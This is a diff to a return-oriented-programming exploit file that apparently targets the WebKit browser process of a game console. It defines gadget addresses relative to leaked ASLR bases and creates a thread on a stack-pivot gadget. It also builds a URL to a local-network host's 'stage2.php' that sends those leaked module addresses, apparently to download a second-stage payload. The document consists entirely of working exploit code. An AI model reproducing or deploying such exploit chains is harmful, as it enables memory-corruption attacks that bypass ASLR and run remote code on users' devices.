@@ -4,8 +4,6 @@ data
 {
 	#include "functions.rop"
 
-	symbol ldm_r1_stuff = ASLR::SceWebKit + 0x54c8; //54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}
-	symbol pop_pc = ASLR::SceWebKit + 0xc048b;
 	symbol stack_size = 6 * 1024 * 1024;
 	symbol SCE_SYSMODULE_NGS = 0xB;
 
@@ -32,11 +30,12 @@ code : entry
 	sceKernelGetModuleInfo([module_list+4*21], module_info);
 	// PRINTF("%x\n", [module_info + 348]); // SceWebKitProcess base addr
 
+#if 0
 	// load NGS and get its base
 	add([module_info + 348], 0x12d48); // cal function import from SceWebKitProcess
 	call_r0(0xB); // sceSysmoduleLoadModule
 	PRINTF("ngs %x\n", &return);
-	
+#endif
 
 
 	sceKernelCreateThread("st2", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
@@ -51,6 +50,8 @@ code : entry
 
 	snprintf(download_url, 256, "http://192.168.140.1:5432/output/stage2.php?b=%x&c=%x&d=%x&", ASLR::SceWebKit+0, ASLR::SceLibKernel+0, ASLR::SceLibc+0);
 	snprintf(tmp, 256, "a=%x", [stack_base]);
+	strcat(download_url, tmp);
+	snprintf(tmp, 256, "&e=%x&f=%x", ASLR::SceLibHttp+0, ASLR::SceNet+0);
 	strcat(download_url, tmp);
 	PRINTF("%s\n", download_url);
 
